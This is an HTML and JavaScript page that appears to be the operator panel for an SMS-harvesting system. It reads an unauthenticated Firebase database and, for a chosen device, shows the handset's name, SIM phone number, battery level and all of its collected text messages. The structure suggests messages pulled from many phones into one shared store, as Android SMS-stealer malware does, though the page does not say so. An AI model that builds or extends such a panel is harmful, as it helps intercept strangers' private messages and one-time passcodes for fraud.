<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Device Messages</title>

    <style>
        * {
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: system-ui, -apple-system, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            margin: 0;
            padding: 16px;
            min-height: 100vh;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            padding-bottom: 40px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #334155;
            padding-bottom: 12px;
            margin-bottom: 16px;
            flex-wrap: wrap;
            gap: 10px;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        .back-btn {
            color: #94a3b8;
            text-decoration: none;
            font-size: 0.85rem;
            padding: 6px 14px;
            border: 1px solid #334155;
            border-radius: 8px;
            transition: 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            min-height: 36px;
            min-width: 36px;
            justify-content: center;
        }

        .back-btn:hover {
            border-color: #10b981;
            color: #10b981;
        }

        .header-title {
            font-weight: 600;
            font-size: 1rem;
        }

        .status-badge {
            font-size: 0.7rem;
            padding: 4px 12px;
            border-radius: 20px;
            background: #1e293b;
            color: #94a3b8;
            border: 1px solid #334155;
            white-space: nowrap;
        }

        .status-badge.live {
            color: #10b981;
            border-color: #10b981;
        }

        .device-info-box {
            background: linear-gradient(145deg, #1a2332, #0f172a);
            border: 1px solid #2d3a4f;
            border-radius: 12px;
            padding: 16px 18px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.4);
        }

        .device-info-left {
            display: flex;
            flex-direction: column;
            gap: 2px;
            min-width: 0;
        }

        .device-info-box .name {
            font-weight: 700;
            font-size: 1.1rem;
            color: #f8fafc;
            word-break: break-word;
        }

        .device-info-box .id {
            font-size: 0.65rem;
            color: #64748b;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }

        .device-info-box .stats {
            font-size: 0.75rem;
            color: #94a3b8;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px;
            background: rgba(255,255,255,0.03);
            padding: 6px 12px;
            border-radius: 8px;
            border: 1px solid #2d3a4f;
        }

        .stat-item {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .divider {
            color: #334155;
        }

        .clickable-phone {
            cursor: pointer;
            color: #10b981;
            padding: 2px 6px;
            border-radius: 4px;
        }

        .clickable-phone::after {
            content: '📋';
            font-size: 0.65rem;
            margin-left: 4px;
            opacity: 0.6;
        }

        .toast-message {
            position: fixed;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%) translateY(20px);
            background: #10b981;
            color: #0f172a;
            padding: 8px 20px;
            border-radius: 8px;
            font-size: 0.85rem;
            font-weight: 600;
            opacity: 0;
            transition: all 0.3s ease;
            pointer-events: none;
            z-index: 999;
        }

        .toast-message.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }

        .sms-card {
            background-color: #1e293b;
            border: 1px solid #334155;
            border-radius: 10px;
            padding: 14px 16px;
            margin-bottom: 12px;
        }

        .meta {
            display: flex;
            justify-content: space-between;
            font-size: 0.8rem;
            color: #10b981;
            margin-bottom: 6px;
            font-weight: 600;
            flex-wrap: wrap;
            gap: 4px;
        }

        .sender {
            display: flex;
            align-items: center;
            gap: 6px;
            word-break: break-word;
        }

        .sender-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: rgba(16,185,129,0.1);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 0.6rem;
            font-weight: 700;
            color: #10b981;
            flex-shrink: 0;
        }

        .time {
            color: #94a3b8;
            font-weight: 400;
            font-size: 0.7rem;
            white-space: nowrap;
        }

        .msg {
            margin: 4px 0 0;
            line-height: 1.6;
            white-space: pre-wrap;
            font-size: 0.92rem;
            color: #e2e8f0;
            word-break: break-word;
        }

        .info {
            font-size: 0.7rem;
            color: #64748b;
            margin-top: 8px;
            border-top: 1px dashed #2d3a4f;
            padding-top: 6px;
            word-break: break-word;
        }

        .loading {
            color: #94a3b8;
            text-align: center;
            padding: 30px 20px;
        }

        .spinner {
            display: inline-block;
            width: 22px;
            height: 22px;
            border: 2.5px solid #2d3a4f;
            border-top: 2.5px solid #10b981;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .no-msg {
            color: #64748b;
            text-align: center;
            padding: 40px 20px;
            background: #1e293b;
            border-radius: 12px;
            border: 1px dashed #2d3a4f;
        }

        .big-icon {
            font-size: 2.5rem;
            display: block;
            margin-bottom: 8px;
        }

        .error {
            color: #ef4444;
            text-align: center;
            padding: 30px 20px;
        }

        @media (max-width: 480px) {
            body {
                padding: 12px;
            }

            .header-title {
                font-size: 0.85rem;
            }

            .device-info-box {
                padding: 12px 14px;
                flex-direction: column;
                align-items: stretch;
            }

            .sms-card {
                padding: 12px 14px;
            }

            .msg {
                font-size: 0.85rem;
            }
        }
    </style>
</head>

<body>

<div class="container">

    <div class="header">

        <div class="header-left">

            <a href="devices.html" class="back-btn">
                ← Devices
            </a>

            <span class="header-title">
                📨 Device Messages
            </span>

        </div>

        <span id="counter" class="status-badge">
            Loading...
        </span>

    </div>


    <div class="device-info-box">

        <div class="device-info-left">

            <div class="name" id="deviceName">
                Loading...
            </div>

            <div class="id" id="deviceId">
                ID: ...
            </div>

        </div>


        <div class="stats" id="deviceStats">

            <span id="msgCount" class="stat-item">
                📨 0 messages
            </span>

        </div>

    </div>


    <div id="toast" class="toast-message">
        ✓ Copied!
    </div>


    <div id="sms-container">

        <div class="loading">

            <span class="spinner"></span>

            Loading messages...

        </div>

    </div>

</div>


<script type="module">

    import {
        initializeApp
    } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";


    import {
        getDatabase,
        ref,
        get
    } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";


    /*
    ============================================
    GET DEVICE ID
    ============================================
    */

    const params =
        new URLSearchParams(
            window.location.search
        );


    const deviceId =
        params.get('device');


    const container =
        document.getElementById(
            'sms-container'
        );


    const counter =
        document.getElementById(
            'counter'
        );


    const deviceNameEl =
        document.getElementById(
            'deviceName'
        );


    const deviceIdEl =
        document.getElementById(
            'deviceId'
        );


    const deviceStats =
        document.getElementById(
            'deviceStats'
        );


    const toast =
        document.getElementById(
            'toast'
        );


    /*
    ============================================
    FIREBASE
    ============================================
    */

    const app = initializeApp({

        databaseURL:
            "https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app"

    });


    const db =
        getDatabase(app);



    /*
    ============================================
    TOAST
    ============================================
    */

    function showToast(message) {

        toast.textContent =
            message;


        toast.classList.add(
            'show'
        );


        clearTimeout(
            toast._timer
        );


        toast._timer =
            setTimeout(

                () => {

                    toast.classList.remove(
                        'show'
                    );

                },

                2000

            );

    }



    /*
    ============================================
    COPY PHONE NUMBER
    ============================================
    */

    function copyPhoneNumber(phone) {

        if (!phone) {
            return;
        }


        let clean =

            phone
                .toString()
                .replace(
                    /[\s\-\(\)]/g,
                    ''
                );


        if (
            clean.startsWith('+91')
        ) {

            clean =
                clean.substring(3);

        }


        if (

            clean.startsWith('91')

            &&

            clean.length > 10

        ) {

            clean =
                clean.substring(2);

        }


        navigator.clipboard

            .writeText(clean)

            .then(

                () => {

                    showToast(

                        `📋 Copied: ${clean}`

                    );

                }

            )

            .catch(

                () => {

                    showToast(

                        '❌ Could not copy'

                    );

                }

            );

    }



    deviceStats.addEventListener(

        'click',

        event => {


            const target =

                event.target.closest(

                    '.clickable-phone'

                );


            if (

                target

                &&

                target.dataset.phone

            ) {

                copyPhoneNumber(

                    target.dataset.phone

                );

            }

        }

    );



    /*
    ============================================
    CREATE SMS CARD
    ============================================

    Uses textContent for SMS data.
    ============================================
    */

    function createSmsCard(sms) {


        const card =

            document.createElement(
                'div'
            );


        card.className =
            'sms-card';



        const meta =

            document.createElement(
                'div'
            );


        meta.className =
            'meta';



        const sender =

            document.createElement(
                'span'
            );


        sender.className =
            'sender';



        const senderIcon =

            document.createElement(
                'span'
            );


        senderIcon.className =
            'sender-icon';


        senderIcon.textContent =

            (
                sms.sender ||
                'U'
            )[0];



        const senderText =

            document.createElement(
                'span'
            );


        senderText.textContent =

            sms.sender ||

            'Unknown';



        sender.appendChild(
            senderIcon
        );


        sender.appendChild(
            senderText
        );



        const time =

            document.createElement(
                'span'
            );


        time.className =
            'time';


        time.textContent =

            `🕐 ${sms.time || 'N/A'}`;



        meta.appendChild(
            sender
        );


        meta.appendChild(
            time
        );



        const message =

            document.createElement(
                'p'
            );


        message.className =
            'msg';


        message.textContent =

            sms.message ||

            '';



        card.appendChild(
            meta
        );


        card.appendChild(
            message
        );



        if (
            sms.info
        ) {


            const info =

                document.createElement(
                    'div'
                );


            info.className =
                'info';


            info.textContent =

                `⚙️ ${sms.info}`;


            card.appendChild(
                info
            );

        }


        return card;

    }



    /*
    ============================================
    LOAD DEVICE INFO
    ============================================
    */

    async function loadDeviceInfo() {


        try {


            const snapshot =

                await get(

                    ref(

                        db,

                        `users/${deviceId}`

                    )

                );


            if (
                !snapshot.exists()
            ) {


                deviceNameEl.textContent =

                    'Device Not Found';


                deviceIdEl.textContent =

                    `ID: ${deviceId}`;


                return;

            }



            const data =

                snapshot.val();



            deviceNameEl.textContent =

                data.device_name ||

                'Unknown Device';



            deviceIdEl.textContent =

                `ID: ${deviceId}`;



            const sim1 =

                data.Sim1 ||

                'No SIM';


            const sim2 =

                data.Sim2 ||

                'No SIM';



            let displayNumber =

                'No Number';



            if (

                sim1 !==
                    'Insert SIM card!'

                &&

                sim1 !==
                    'Number not available'

                &&

                sim1 !==
                    'No SIM'

            ) {

                displayNumber =
                    sim1;

            }

            else if (

                sim2 !==
                    'Insert SIM card!'

                &&

                sim2 !==
                    'Number not available'

                &&

                sim2 !==
                    'No SIM'

            ) {

                displayNumber =
                    sim2;

            }



            deviceStats.innerHTML = '';


            if (

                displayNumber !==
                'No Number'

            ) {


                const phone =

                    document.createElement(
                        'span'
                    );


                phone.className =

                    'clickable-phone stat-item';


                phone.dataset.phone =

                    displayNumber;


                phone.textContent =

                    `📞 ${displayNumber}`;


                deviceStats.appendChild(
                    phone
                );


                const divider1 =

                    document.createElement(
                        'span'
                    );


                divider1.className =
                    'divider';


                divider1.textContent =
                    '·';


                deviceStats.appendChild(
                    divider1
                );

            }



            const battery =

                document.createElement(
                    'span'
                );


            battery.className =
                'stat-item';


            battery.textContent =

                `🔋 ${data.charge || 0}%`;


            deviceStats.appendChild(
                battery
            );



            const divider2 =

                document.createElement(
                    'span'
                );


            divider2.className =
                'divider';


            divider2.textContent =
                '·';


            deviceStats.appendChild(
                divider2
            );



            const count =

                document.createElement(
                    'span'
                );


            count.className =
                'stat-item';


            count.id =
                'msgCount';


            count.textContent =
                '📨 Loading...';


            deviceStats.appendChild(
                count
            );


        }

        catch (error) {


            console.error(

                'Device info error:',

                error

            );

        }

    }



    /*
    ============================================
    LOAD MESSAGES
    ============================================

    NO orderByChild()
    NO equalTo()
    NO .indexOn required.

    Because the existing database is flat,
    Firebase must still download smsData.

    We scan it once and keep only messages
    belonging to this device.

    ============================================
    */

    async function loadMessages() {


        try {


            console.time(
                'SMS load'
            );


            const snapshot =

                await get(

                    ref(

                        db,

                        'common/smsData'

                    )

                );


            /*
            ====================================
            FILTER IN ONE PASS
            ====================================
            */


            const deviceMessages = [];


            if (
                snapshot.exists()
            ) {


                snapshot.forEach(

                    childSnapshot => {


                        const sms =

                            childSnapshot.val();


                        if (

                            sms

                            &&

                            sms.deviceId ===
                            deviceId

                        ) {


                            deviceMessages.push({

                                id:
                                    childSnapshot.key,

                                ...sms

                            });

                        }

                    }

                );

            }



            /*
            ====================================
            PUSH IDS ARE CHRONOLOGICAL

            Matching messages were encountered
            oldest -> newest.

            Reverse to display newest first.
            ====================================
            */


            deviceMessages.reverse();



            /*
            ====================================
            UPDATE MESSAGE COUNT
            ====================================
            */


            const total =

                deviceMessages.length;


            counter.textContent =

                `${total} messages`;


            counter.className =

                total > 0

                    ? 'status-badge live'

                    : 'status-badge';



            const msgCount =

                document.getElementById(
                    'msgCount'
                );


            if (msgCount) {


                msgCount.textContent =

                    `📨 ${total} messages`;

            }



            /*
            ====================================
            NO MESSAGES
            ====================================
            */


            if (
                total === 0
            ) {


                container.innerHTML = `

                    <div class="no-msg">

                        <span class="big-icon">
                            📭
                        </span>

                        No messages for this device

                    </div>

                `;


                console.timeEnd(
                    'SMS load'
                );


                return;

            }



            /*
            ====================================
            RENDER
            ====================================
            */


            container.innerHTML = '';


            const fragment =

                document.createDocumentFragment();



            for (

                const sms of
                deviceMessages

            ) {


                fragment.appendChild(

                    createSmsCard(
                        sms
                    )

                );

            }



            container.appendChild(
                fragment
            );



            console.timeEnd(
                'SMS load'
            );


            console.log(

                `Loaded ${total} messages for ${deviceId}`

            );


        }

        catch (error) {


            console.error(

                'SMS loading error:',

                error

            );


            container.innerHTML =

                `<div class="error">
                    ❌ ${error.message}
                </div>`;


            counter.textContent =

                'Error';

        }

    }



    /*
    ============================================
    START
    ============================================
    */


    if (!deviceId) {


        container.innerHTML =

            '<div class="error">❌ No device specified</div>';


        counter.textContent =

            'Error';

    }

    else {


        /*
        Load device info and SMS simultaneously
        instead of waiting for one before the other.
        */


        Promise.all([

            loadDeviceInfo(),

            loadMessages()

        ]);


    }

</script>

</body>
</html>
